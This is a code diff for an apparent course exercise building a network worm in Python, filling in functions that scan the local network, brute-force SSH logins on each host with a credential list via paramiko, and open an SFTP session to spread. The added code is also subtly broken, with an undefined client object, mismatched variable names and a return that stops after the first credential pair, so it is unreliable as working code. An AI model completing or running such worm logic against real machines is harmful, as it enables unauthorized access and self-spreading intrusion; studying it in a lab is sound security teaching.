@@ -74,7 +74,16 @@ def spreadAndExecute(sshClient):
 ###########################################################
 def tryCredentials(host, userName, password, sshClient):
 
-	ssh.connect()
+	try:
+		ssh.connect(host, username=username, password=password)
+	except socket.error:
+		print "Server is down"
+	except paramiko.SSHException:
+		print "Credentials are not correct"
+	else:
+		sftpClient = ssh.open_sftp()
+		return sftpClient
+
 	# Tries to connect to host host using
 	# the username stored in variable userName
 	# and password stored in variable password
@@ -121,7 +130,8 @@ def attackSystem(host):
 	# Go through the credentials
 	for (username, password) in credList:
 
-		tryCredentials(host, username, password, ssh)
+		attemptResults = tryCredentials(host, username, password, ssh)
+		return attemptResults
 		# TODO: here you will need to
 		# call the tryCredentials function
 		# to try to connect to the
@@ -222,6 +232,8 @@ networkHosts = getHostsOnTheSameNetwork()
 # TODO: Remove the IP of the current system
 # from the list of discovered systems (we
 # do not want to target ourselves!).
+networkHosts.remove(selfIP)
+
 
 print "Found hosts: ", networkHosts
 
